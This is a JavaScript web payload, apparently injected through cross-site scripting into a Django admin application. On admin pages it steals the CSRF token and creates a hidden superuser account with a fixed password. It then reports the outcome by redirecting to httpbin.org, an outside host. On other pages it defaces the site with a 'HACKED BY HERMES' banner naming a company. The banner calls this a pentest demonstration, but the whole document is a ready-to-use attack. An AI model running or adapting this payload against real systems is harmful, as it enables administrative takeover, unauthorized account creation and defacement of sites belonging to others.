let u=location.href;
if(u.includes('/admin/')){
  fetch('/admin/auth/user/add/').then(r=>r.text()).then(t=>{
    let m=t.match(/csrfmiddlewaretoken['"]?\s*value=['"]([^'"]+)/);
    if(!m){ location='https://httpbin.org/get?done=NO_CSRF'; return; }
    let f=new FormData();
    f.append('csrfmiddlewaretoken',m[1]);
    f.append('username','hermesbreakthrough');
    f.append('password1','HermesBreak123!');
    f.append('password2','HermesBreak123!');
    f.append('is_superuser','on');
    f.append('is_staff','on');
    f.append('_save','Save');
    fetch('/admin/auth/user/add/',{method:'POST',body:f}).then(rr=>rr.text()).then(tt=>{
      location='https://httpbin.org/get?done=OK&status='+(tt.includes('hermesbreakthrough')?'CREATED':'NOT_CREATED')+'&len='+tt.length;
    });
  });
} else {
  document.documentElement.innerHTML=`<head><title>HACKED BY HERMES</title><meta name='viewport' content='width=device-width,initial-scale=1'></head><body style='margin:0;font-family:sans-serif;background:#000;color:#0f0;text-align:center;padding-top:15vh'><h1 style='font-size:48px'>HACKED BY HERMES</h1><p>Sanindo Multi Tekno internal app has been compromised.</p><p>This is a non-destructive pentest demonstration.</p><p style='margin-top:40px'><small>Contact: security@suriota.com</small></p></body>`;
}